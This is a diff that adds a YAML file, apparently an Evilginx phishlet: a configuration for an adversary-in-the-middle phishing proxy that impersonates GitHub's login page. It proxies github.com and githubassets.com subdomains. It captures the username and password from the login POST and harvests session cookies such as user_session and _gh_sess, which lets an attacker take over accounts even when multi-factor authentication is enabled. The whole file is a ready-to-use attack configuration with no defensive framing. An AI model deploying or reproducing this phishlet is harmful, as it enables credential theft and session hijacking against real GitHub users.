@@ -1,1 +1,27 @@
-
+author: '@fatiu'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'collector', orig_sub: 'collector', domain: 'github.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com', session: true, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.github.com', orig_sub: 'www', domain: 'github.com', search: '""', replace: '""', mimes: ['application/json']}
+#  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.github.com'
+    keys: ['dotcom_user', 'logged_in']
+  - domain: 'github.com'
+    keys: ['__Host-user_session_same_site', '_gh_sess', 'saved_user_sessions', 'user_session']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'github.com'
+  path: '/login'
